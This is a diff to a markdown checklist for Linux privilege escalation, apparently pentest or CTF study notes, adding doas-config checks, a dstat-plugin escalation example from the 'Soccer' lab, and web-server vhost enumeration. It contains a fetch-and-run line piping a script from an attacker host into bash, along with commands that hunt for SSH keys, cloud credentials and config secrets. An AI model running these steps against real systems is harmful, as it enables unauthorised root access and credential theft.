@@ -17,6 +17,7 @@ Reference: [Linux Privilege Escalation](../4-post-exploitation/01-linux-privileg
 - [ ] Upload and run **linpeas**: `curl <kali>/linpeas.sh | bash | tee /tmp/lp.out`.
 - [ ] Read the RED/YELLOW findings — that's where your privesc lives.
 - [ ] If linpeas can't run (no network, no `curl`) — fall back to the manual checks below.
+- [ ] **Re-run linpeas + `sudo -l`/`doas` checks after EVERY user switch.** Privesc is iterative — each user has different group memberships, sudo/doas rules, readable files and home-dir secrets. The chain is often `www-data` → user A → user B → root, and linpeas run as `www-data` will *not* see user A's doas rule or `~/.ssh`. Re-enumerate as whoever you just became.
 
 ## Manual quick wins (in order of frequency)
 
@@ -24,6 +25,7 @@ Reference: [Linux Privilege Escalation](../4-post-exploitation/01-linux-privileg
   - Check every allowed binary at [GTFOBins](https://gtfobins.github.io/).
   - No password required? `sudo <binary>` and pick the escape.
   - Password required and you have it? Same thing, `sudo -S`.
+- [ ] `doas` present (`which doas`)? There is **no reliable `doas -l`** — read the config instead: `cat /etc/doas.conf /usr/local/etc/doas.conf 2>/dev/null` (path varies by build; source builds use `/usr/local/etc`). A `permit nopass <user> as root cmd <bin>` line + a GTFOBins-able or plugin-loading binary = root. (Soccer: `permit nopass player as root cmd /usr/bin/dstat` + world/group-writable plugin dir → drop `dstat_x.py` → `doas dstat --x`.)
 - [ ] SUID binaries: `find / -perm -4000 -type f 2>/dev/null`.
   - Anything not in the standard list? GTFOBins it.
 - [ ] Capabilities: `getcap -r / 2>/dev/null`.
@@ -39,7 +41,8 @@ Reference: [Linux Privilege Escalation](../4-post-exploitation/01-linux-privileg
 - [ ] `history` / `.bash_history` / `.zsh_history` — passwords in `mysql -p<pw>`, `curl -u`, etc.
 - [ ] `.ssh/` — private keys? `id_rsa` without a passphrase is a free shell.
 - [ ] `~/.aws/credentials`, `~/.docker/config.json`, `~/.git-credentials`.
-- [ ] `/var/www/` config files — `wp-config.php`, `.env`, `config.php`, `settings.py`.
+- [ ] `/var/www/` **app** config files — `wp-config.php`, `.env`, `config.php`, `settings.py` (DB creds, API keys).
+- [ ] `/var/www/` or wherever the **web-server** config lives — top check as `www-data`. Reveals **internal vhosts** not in public DNS, plus `proxy_pass` backends and doc roots: `grep -riE 'server_name|proxy_pass|root' /etc/nginx/ /etc/apache2/ 2>/dev/null`. New vhost → add to `/etc/hosts`, then attack it (SQLi/XSS/etc on every input). This is the `www-data` → next-foothold pivot when no local privesc is obvious (e.g. Soccer's `soc-player` vhost).
 - [ ] `/opt/`, `/srv/` — custom apps with hardcoded creds.
 - [ ] `find / -name "*.conf" -readable 2>/dev/null | xargs grep -l -iE 'pass|pwd|secret'`.
 - [ ] Backups: `find / -name "*.bak" -o -name "*.old" -o -name "*~" 2>/dev/null`.
